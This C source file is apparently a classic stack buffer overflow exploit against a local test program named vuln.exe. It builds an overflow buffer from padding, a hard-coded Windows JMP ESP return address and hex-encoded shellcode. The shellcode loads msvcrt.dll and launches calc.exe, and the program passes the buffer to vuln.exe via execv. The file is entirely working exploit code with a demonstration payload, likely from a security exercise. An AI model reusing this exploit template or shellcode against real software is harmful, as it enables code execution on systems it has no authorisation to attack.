#include <stdio.h>
#include <stdlib.h>
#include <string.h>



//  BUFFER OVERFLOW VULNERABILITY
//  strcat for insert shellcode in the middle of the buffer
//  Buffer contains 1024 bytes but insert shellcode in the middle of the buffer
//  Shellcode calc.exe
//  Jump ESP = 0x7C86467B with findjump.exe
int main(int argc, char **argv)
{
    char *arguments[3];
    char buffer[1024] = "424242424242424242424242424242424242424242424242THISCONTAINMORETHAN72NOWJUMP";
    char shellcode_code[] = "\x55\x8b\xec\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff\xd3";
    char jump_calc[] = "\x7B\x46\x86\x7C";
    

    strcat(buffer, jump_calc);
    strcat(buffer, shellcode_code);

    arguments[0] = "vuln.exe";
    arguments[1] = buffer;
    arguments[2] = NULL;

    execv("vuln.exe", arguments);

    return 0;

}